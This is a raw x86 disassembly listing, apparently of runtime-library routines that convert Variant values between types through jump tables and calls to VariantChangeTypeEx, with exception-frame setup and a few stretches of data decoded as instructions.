mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
fld [ esi + 0x8 ]
call sub_402ab8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
fild [ esi + 0x8 ]
fdiv [ r-xdata ]
call sub_402ab8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
fld [ esi + 0x8 ]
call sub_402ab8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40464c
mov eax [ ebp - 0x4 ]
call sub_408b44
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
movsx eax [ esi + 0x8 ]
cdq
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
movsx eax [ esi + 0x8 ]
cdq
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
xor eax eax
mov al [ esi + 0x8 ]
xor edx edx
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
movzx eax [ esi + 0x8 ]
xor edx edx
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
mov eax [ esi + 0x8 ]
xor edx edx
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov [ ebx ] di
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e87b
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40e888
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40e9ec
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax bx
cmp eax 0x14
ja r-xdata
call sub_40e298
jmp [ eax * 4 + jump_table_40e8b9 ]
mov ax [ edi + 0x8 ]
mov [ esi + 0x8 ] ax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
fild [ edi + 0x8 ]
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
fild [ edi + 0x8 ]
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
fild [ edi + 0x8 ]
fmul [ r-xdata ]
fistp [ esi + 0x8 ]
fwait
jmp r-xdata
fild [ edi + 0x8 ]
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
push [ edi + 0xc ]
push [ edi + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_408abc
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_404c68
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40f79c
jmp r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov al [ edi + 0x8 ]
mov [ esi + 0x8 ] al
jmp r-xdata
mov al [ edi + 0x8 ]
mov [ esi + 0x8 ] al
jmp r-xdata
mov ax [ edi + 0x8 ]
mov [ esi + 0x8 ] ax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov [ esi ] bx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9f3
lea eax [ ebp - 0x8 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
setne al
neg al
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
sub_40ea00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40ea5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40e6dc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx edi
call sub_40ea80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea61
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
sub_40ea80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov edi edx
mov esi eax
mov bx [ edi ]
and bx 0xfff
mov ax [ ebp - 0x2 ]
and ax 0xfff
mov [ ebp - 0x4 ] ax
mov eax esi
call sub_40e2b0
cmp bx 0x10f
jae r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_411fd4
test al al
je r-xdata
mov ax [ ebp - 0x4 ]
sub ax 0x14
je r-xdata
call sub_40e2a0
mov ax [ ebp - 0x2 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
mov edx edi
mov eax esi
mov cx [ ebp - 0x2 ]
call sub_40e6ec
jmp r-xdata
sub ax 0xec
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx edi
mov eax esi
mov cx [ ebp - 0x2 ]
call sub_40ea68
test al al
jne r-xdata
dec ax
je r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40eb3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp - 0x2 ]
push eax
push 0x0
push 0x400
push edi
lea eax [ ebp - 0x1c ]
push eax
call VariantChangeTypeEx
test eax eax
je r-xdata
mov edx edi
mov eax esi
mov cx [ ebp - 0x2 ]
call sub_40ea00
jmp r-xdata
jmp r-xdata
mov edi esi
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e2b0
retn
call sub_40e298
cmp [ ebp - 0x4 ] 0x10f
jae r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x4 ]
call sub_411fd4
test al al
je r-xdata
cmp bx 0x14
jne r-xdata
call sub_40e2a0
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
mov edx edi
mov eax esi
mov cx [ ebp - 0x2 ]
call sub_40ea68
test al al
jne r-xdata
mov edx edi
mov eax esi
mov cx [ ebp - 0x2 ]
call sub_40e888
jmp r-xdata
mov ax [ ebp - 0x2 ]
push eax
push 0x0
push 0x400
push edi
push esi
call VariantChangeTypeEx
test eax eax
je r-xdata
call sub_40e298
sub_40ec08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_405244
mov eax ebx
call sub_40e2b0
mov [ ebx ] 0x100
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
pop ebx
pop ecx
pop ebp
retn
sub_40ec38
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_405268
mov esi eax
mov eax ebx
call sub_40e2b0
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40ec60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp - 0x4 ]
mov bx [ ebx ]
mov si [ ebp - 0x8 ]
mov eax edi
call sub_40e2b0
cmp si bx
jne r-xdata
cmp bx 0x100
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40e6dc
jmp r-xdata
cmp si 0x100
jne r-xdata
cmp si 0x8
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx esi
call sub_40ea80
cmp bx 0x101
je r-xdata
lea eax [ ebp - 0x18 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40ecf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
call sub_40ec38
lea edx [ ebp - 0x18 ]
mov eax edi
mov ecx esi
call sub_40ea80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x18 ]
call sub_40e2b0
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ec38
jmp r-xdata
cmp bx 0x8
jne r-xdata
lea eax [ ebp - 0x18 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40ed61
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
mov cx 0x8
call sub_40ea80
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_40ec08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x18 ]
call sub_40e2b0
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ec08
jmp r-xdata
sub_40ed7c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov ebp edx
mov edi eax
cmp ebx 0x100
jl r-xdata
mov si [ ebp ]
and si 0xfff
mov eax edi
call sub_40e2b0
cmp si 0x10f
jae r-xdata
call sub_40e298
mov edx esp
mov eax esi
call sub_411fd4
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx ebx
call sub_40ec60
jmp r-xdata
call sub_40e298
push ebx
mov ecx ebp
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40ede4
push ebx
add esp 0xfffffff0
mov ebx eax
movzx eax [ ebx ]
cmp eax 0x14
ja r-xdata
mov eax esp
call sub_40e2a8
mov edx ebx
mov eax esp
mov ecx 0x3
call sub_40ec60
mov eax [ esp + 0x8 ]
jmp [ eax * 4 + jump_table_40edfd ]
mov eax [ ebx + 0x8 ]
jmp r-xdata
movsx eax [ ebx + 0x8 ]
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
jmp r-xdata
movsx eax [ ebx + 0x8 ]
jmp r-xdata
movzx eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
fld [ ebx + 0x8 ]
call sub_402ab8
jmp r-xdata
fld [ ebx + 0x8 ]
call sub_402ab8
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
call sub_402ab8
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_40eec0
push ebx
add esp 0xffffffe8
mov ebx eax
movzx eax [ ebx ]
cmp eax 0x14
ja r-xdata
lea eax [ esp + 0x8 ]
call sub_40e2a8
mov edx ebx
lea eax [ esp + 0x8 ]
mov ecx 0x3
call sub_40ec60
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp [ eax * 4 + jump_table_40eed9 ]
mov eax [ ebx + 0x8 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
movsx eax [ ebx + 0x8 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
movsx eax [ ebx + 0x8 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
movzx eax [ ebx + 0x8 ]
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0x8 ]
call sub_402ab8
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
fld [ ebx + 0x8 ]
call sub_402ab8
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
call sub_402ab8
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
sub_40f00c
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx ] 0xb
jne r-xdata
mov eax esp
call sub_40e2a8
mov edx ebx
mov eax esp
mov ecx 0xb
call sub_40ec60
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_40f048
push ebx
add esp 0xffffffd8
mov ebx eax
movzx eax [ ebx ]
cmp eax 0x14
ja r-xdata
lea eax [ esp + 0xa ]
call sub_40e2a8
mov edx ebx
lea eax [ esp + 0xa ]
mov ecx 0x5
call sub_40ec60
fld [ esp + 0x12 ]
fstp [ esp ]
fwait
jmp [ eax * 4 + jump_table_40f061 ]
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0x20 ] eax
xor eax eax
mov [ esp + 0x24 ] eax
fild [ esp + 0x20 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x28
pop ebx
retn
sub_40f184
push ebx
add esp 0xffffffdc
mov ebx eax
movzx eax [ ebx ]
cmp eax 0x14
ja r-xdata
lea eax [ esp + 0x8 ]
call sub_40e2a8
mov edx ebx
lea eax [ esp + 0x8 ]
mov ecx 0x6
call sub_40ec60
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
jmp [ eax * 4 + jump_table_40f19d ]
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x20 ] eax
fild [ esp + 0x1c ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x24
pop ebx
retn
sub_40f2f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebx ] 0x100
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40f35c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
mov ecx 0x100
call sub_40ec60
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404480
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f36c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f3af
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40f2f8
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx 0xff
call sub_4046c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3b6
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40f3bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebx ] 0x8
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40f41f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
mov ecx 0x8
call sub_40ec60
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404c2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404c2c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f42c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40f48d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40e6dc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4061ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f494
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
call sub_40e298
sub_40f49c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0x101
jg r-xdata
sub eax 0x4009
je r-xdata
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4061ac
jmp r-xdata
sub eax 0x4
je r-xdata
mov edx ebx
mov eax esi
call sub_40f42c
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
jmp r-xdata
mov eax esi
call sub_406194
jmp r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_411fd4
test al al
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4061ac
jmp r-xdata
sub eax 0x4
je r-xdata
call sub_40e298
mov eax esi
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403774
test al al
jne r-xdata
jmp r-xdata
sub_40f52d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_406194
jmp r-xdata
sub ax 0x8
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4061ac
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4061ac
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_411fd4
test al al
je r-xdata
call sub_40e298
mov eax esi
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403774
test al al
jne r-xdata
sub_40f5b2
add [ eax ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
call sub_411a58
or eax eax
jne r-xdata
retn
jmp sub_40e298
sub_40f5d4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
add esi 0x3
cmp esi 0x7
ja r-xdata
mov eax ebx
call sub_40e2b0
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] edi
jmp [ esi * 4 + jump_table_40f5f9 ]
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] di
jmp r-xdata
mov [ ebx ] 0x10
mov eax edi
mov [ ebx + 0x8 ] al
jmp r-xdata
mov [ ebx ] 0x11
mov eax edi
mov [ ebx + 0x8 ] al
jmp r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] di
jmp r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx ] 0xa
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f664
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40e2b0
sub_40f684
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e2b0
sub_40f6b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi ] 0x8
jb r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e2b0
sub_40f720
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404480
pop esi
pop ebx
retn
mov eax ebx
call sub_40e2b0
sub_40f74c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f78f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404688
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f796
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40f79c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404d78
pop esi
pop ebx
retn
mov eax ebx
call sub_40e2b0
sub_40f7d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4061ac
pop esi
pop ebx
retn
mov eax ebx
call sub_40e2b0
sub_40f800
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x8
jb r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4061ac
pop esi
pop ebx
retn
mov eax ebx
call sub_40e2b0
sub_40f840
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f883
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404c68
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f79c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f88a
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
sub_40f890
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f8d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404688
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f840
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8da
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_40f8e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40f935
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40e6dc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40e6dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f93c
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
sub_40f944
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov bx [ esi ]
and bx 0xfff
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_411fd4
test al al
je r-xdata
mov edx esi
mov eax edi
call sub_40f98c
jmp r-xdata
call sub_40e2a0
mov ecx esi
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40f98c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_40e2b0
mov ax [ ebx ]
mov esi eax
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx esp
mov eax esi
call sub_411fd4
test al al
je r-xdata
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
jg r-xdata
call sub_40e2a0
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub edx 0x100
je r-xdata
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
mov eax edi
call sub_40f840
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add edx 0xfffffff0
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax edi
call sub_40f8e0
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax edi
mov cx 0x3
call sub_40ea80
jmp r-xdata
je r-xdata
test ah 0x20
je r-xdata
mov edx ebx
mov eax edi
mov cx 0x5
call sub_40ea80
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40e6dc
jmp r-xdata
mov ecx sub_40f944
mov edx ebx
mov eax edi
call sub_40e3f0
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax edi
mov cx 0x5
call sub_40ea80
jmp r-xdata
mov edx ebx
mov eax edi
mov cx 0x3
call sub_40ea80
jmp r-xdata
mov edx ebx
mov eax edi
mov cx 0x3
call sub_40ea80
jmp r-xdata
jmp r-xdata
sub_40fac8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fb6c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x100
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_405334
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_405334
mov edx [ ebp - 0x10 ]
pop eax
call sub_404c94
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_405388
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40532c
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40532c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4046ec
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_405380
jmp r-xdata
xor eax eax
pop edx
